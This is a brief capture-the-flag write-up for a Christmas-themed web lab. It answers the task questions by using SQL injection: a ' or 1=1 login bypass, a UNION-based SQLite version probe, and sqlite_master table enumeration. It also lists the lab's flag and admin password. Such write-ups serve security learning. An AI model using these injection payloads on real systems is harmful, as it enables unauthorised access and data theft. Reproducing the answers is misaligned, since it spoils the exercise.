***Without using directory brute forcing, what's Santa's secret login panel?***  
Look at hint  

***Visit Santa's secret login panel and bypass the login using SQLi***  
Visit login page, try sql payload to bypass login. I success with payload `' or 1=1--+-`  

***How many entries are there in the gift database?***  
On the main page, we have formed to find users with their wishes. Check with payload `' or 1=1--+-` and we have SQL injection. Answer `22`  
  
***What did Paul ask for?***  
`Github Ownership`  

First we need to count columns, use `Union` attack, i found it has 2 columns   
After some check version, i found the web use `SQLite` with `' union select sqlite_version,null--+--`  
Using `SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` to enumerate table. We found 3 table `hidden_value`, `users`, `forgot`
The flag is in `hidden_value`  
***What is the flag?***  
`thmfox{All_I_Want_for_Christmas_Is_You}`  

***What is admin's password?***  
Admin password is in table `users`. Answer `EhCNSWzzFP6sc7gB`  



